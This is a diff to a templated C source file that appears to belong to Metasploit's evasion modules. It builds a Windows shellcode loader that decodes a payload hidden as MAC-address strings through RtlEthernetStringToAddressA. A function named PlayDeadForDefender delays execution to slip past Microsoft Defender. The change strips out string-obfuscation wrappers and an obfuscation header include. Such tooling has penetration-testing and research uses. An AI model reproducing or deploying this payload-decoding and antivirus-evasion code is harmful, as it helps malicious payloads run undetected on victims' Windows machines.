@@ -1,6 +1,5 @@
 #include <windows.h>
 #include <stdio.h>
-#include "<%= File.join(Msf::Config.data_directory, 'headers', 'windows', 'obfusheader.h') %>"
 
 #define SCSIZE <%= encoded_payload_length %>
 #define SCSIZE_ENC <%= encrypted_payload_length %>
@@ -26,7 +25,7 @@ void DecodePayload()
     PBYTE tmp = (PBYTE)(&bPayload);
 
     //TODO: API hashing here pls
-    fnRtlEthernetStringToAddressA fncMacDeobfuscate = (fnRtlEthernetStringToAddressA)GetProcAddress(LoadLibrary(OBF("ntdll.dll")), OBF("RtlEthernetStringToAddressA"));
+    fnRtlEthernetStringToAddressA fncMacDeobfuscate = (fnRtlEthernetStringToAddressA)GetProcAddress(LoadLibrary(("ntdll.dll")), ("RtlEthernetStringToAddressA"));
 
     for (int i = 0; i != SCSIZE ; i+=1) {
         fncMacDeobfuscate(bPayloadEncoded+i*18, &terminator, (LPCSTR)tmp);
@@ -47,7 +46,7 @@ int PlayDeadForDefender()
     Delay = dwMilliSeconds * 10000;
 	DelayInterval.QuadPart = - Delay;
 
-    fnNtDelayExecution fncNtDelayExecution = (fnNtDelayExecution)GetProcAddress(LoadLibrary(OBF("ntdll.dll")), OBF("NtDelayExecution"));
+    fnNtDelayExecution fncNtDelayExecution = (fnNtDelayExecution)GetProcAddress(LoadLibrary(("ntdll.dll")), ("NtDelayExecution"));
 
     _T0 = GetTickCount();
 
